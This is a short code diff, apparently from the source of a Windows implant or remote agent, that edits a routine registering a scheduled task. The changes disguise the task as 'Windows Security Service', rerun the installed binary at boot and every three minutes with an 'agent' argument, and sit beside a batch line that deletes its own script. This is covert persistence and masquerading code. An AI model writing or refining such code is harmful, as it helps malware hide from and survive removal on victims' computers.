@@ -205,7 +205,7 @@ del /f /q ""%~f0""
                 string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
 <Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
   <RegistrationInfo>
-    <Description>Microsoft Security Service</Description>
+    <Description>Windows Security Service</Description>
   </RegistrationInfo>
   <Triggers>
     <BootTrigger>
@@ -213,7 +213,7 @@ del /f /q ""%~f0""
     </BootTrigger>
     <TimeTrigger>
       <Repetition>
-        <Interval>PT5M</Interval>
+        <Interval>PT3M</Interval>
         <StopAtDurationEnd>false</StopAtDurationEnd>
       </Repetition>
       <StartBoundary>2020-01-01T00:00:00</StartBoundary>
@@ -244,11 +244,12 @@ del /f /q ""%~f0""
   <Actions Context=""Author"">
     <Exec>
       <Command>""{Config.InstallPath}""</Command>
+      <Arguments>agent</Arguments>
     </Exec>
   </Actions>
 </Task>";
 
-                File.WriteAllText(xmlPath, taskXml);
+                File.WriteAllText(xmlPath, taskXml, System.Text.Encoding.Unicode);
 
                 var proc = new Process
                 {
